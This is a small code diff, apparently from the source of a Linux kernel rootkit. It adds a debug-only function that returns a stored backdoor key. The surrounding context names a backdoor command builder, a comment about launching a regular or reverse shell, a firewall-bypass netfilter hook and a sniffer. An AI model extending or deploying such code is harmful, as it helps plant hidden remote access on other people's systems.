@@ -258,6 +258,7 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port, __be32 saddr,
 	}
 	return bd;
 }
+
 /**
  * Execute backdoor that can be either regular
  * or reverse shell
@@ -614,6 +615,13 @@ static unsigned int _sock_hook_nf_fw_bypass(void *priv, struct sk_buff *skb,
 	}
 	return rc;
 }
+
+#ifdef DEBUG_RING_BUFFER
+struct kv_crypto_st *kv_sock_get_mgc(void)
+{
+	return kvmgc_bdkey;
+}
+#endif
 
 struct task_struct *kv_sock_start_sniff(void)
 {
